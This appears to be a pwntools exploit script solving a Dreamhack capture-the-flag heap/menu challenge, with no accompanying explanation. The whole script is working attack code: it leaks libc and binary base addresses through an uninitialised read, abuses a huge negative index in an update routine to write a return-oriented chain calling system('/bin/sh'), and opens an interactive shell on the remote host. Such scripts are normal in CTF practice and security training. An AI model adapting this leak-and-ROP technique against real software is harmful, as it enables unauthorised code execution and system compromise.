#!/usr/bin/env python3
from pwn import *
import binascii
import sys

exe_path = 'prob_patched'
HOST = 'host8.dreamhack.games'
PORT = 23480

exe = ELF(exe_path, checksec=False)
libc = exe.libc
context.binary = exe
context.terminal = [
    'cmd.exe', '/c', 'start',
    'wt.exe', '-w', '0', 'split-pane', '-V',
    '-d', '.',
    'wsl.exe',
    '-d', 'kali-linux',
    'bash', '-c'
]

gdbscript = '''
brva 0x1352
brva 0x13c3
brva 0x1656
brva 0x1545
continue
'''

def start():
    if args.REMOTE:
        return remote(HOST, PORT)
    p = process(exe.path)
    if args.GDB:
        gdb.attach(p, gdbscript=gdbscript)
        input()
    return p

p = start()

def sla(prompt, data):
    p.sendlineafter(prompt, data)
def sa(prompt, data):
    p.sendafter(prompt, data)
def s(prompt):
    p.send(prompt)
def sl(data):
    p.sendline(data)
def rcu(data):
    return p.recvuntil(data)
def rl():
    return p.recvline()

# ============================EXPLOIT============================
def create(size, data):
    sla(b'> ', b'1')
    sla(b'size: ', str(size).encode())
    sa(b'data: ', data)
def read(idx):
    sla(b'> ', b'2')
    sla(b'index: ', str(idx).encode())
    return p.recv(0x218)
def update(idx, size, data):
    sla(b'> ', b'3')
    sla(b'index: ', str(idx).encode())
    sla(b'size: ', str(size).encode())
    sa(b'data: ', data)
def delete(idx):
    sla(b'> ', b'4')
    sla(b'index: ', str(idx).encode())

# slots <= 9
# size <= 0x28

sla(b'> ', b'1')
sla(b'size: ', b'538')
leak = read(0)[0x1f0::]
libc.address = u64(leak[:0x8]) - 0x2a1ca
exe.address = u64(leak[0x20:0x28]) - 0x16e3

log.success(f'libc: {hex(libc.address)}')
log.success(f'exe: {hex(exe.address)}')

pop_rdi = 0x000000000010f75b + libc.address
binsh = next(libc.search(b'/bin/sh\x00'))
system = libc.sym.system
ret = 0x000000000000101a + exe.address

update(-1537228672809129302, 0x28, p64(pop_rdi) + p64(binsh) + p64(ret) + p64(system))

p.interactive()

